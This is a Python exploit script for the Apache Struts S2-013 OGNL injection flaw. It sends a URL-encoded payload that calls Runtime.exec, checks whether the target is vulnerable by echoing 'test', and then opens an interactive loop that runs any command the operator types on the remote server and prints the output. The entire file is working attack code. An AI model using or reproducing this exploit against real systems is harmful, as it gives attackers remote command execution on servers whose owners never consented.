import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_013(url):
    # Struts 2.0.0 - Struts 2.3.14.1
    payload = '%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27echo test%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
    # url = 'http://192.168.6.217:8080/link.action?'
    post_url = url + payload
    s = requests.get(url=post_url, headers=headers)
    if len(s.text) != None and 'test' in s.text:
        print("存在s2-013漏洞")
        s2_013exp(url)
    else:
        pass

def s2_013exp(url):
    while True:
        exec = input("exec:")
        payload = '%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27'+exec+'%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
        get_url = url + payload
        page = requests.get(url=get_url,headers=headers)
        print(page.text)

if __name__ == '__main__':
    url = input("test url:")
    s2_013(url)
